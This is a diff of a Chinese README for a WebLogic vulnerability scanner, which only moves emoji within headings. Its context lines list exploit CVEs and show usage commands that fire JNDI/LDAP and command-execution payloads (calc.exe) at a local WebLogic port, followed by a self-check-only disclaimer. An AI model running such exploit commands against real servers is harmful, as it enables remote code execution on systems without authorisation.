@@ -1,4 +1,4 @@
-👻# WeblogicScan.go
+# 👻WeblogicScan.go
 
 只是好好的集成了一下，方便和我一样的懒人。
 
@@ -43,7 +43,7 @@ cve-2020-2883
 cve-2023-21839
 ```
 
-🐳# 使用示例
+# 🐳使用示例
 
 ```md
 -u url
@@ -74,7 +74,7 @@ WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 14882
 WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c calc.exe -e 2883
 ```
 
-👮# 免责声明
+# 👮免责声明
 
 该工具仅用于安全自查检测
 
@@ -82,7 +82,7 @@ WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c calc.exe -e 2883
 
 本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
 
-📷# 参考
+# 📷参考
 
 https://github.com/0xn0ne/weblogicScanner
 
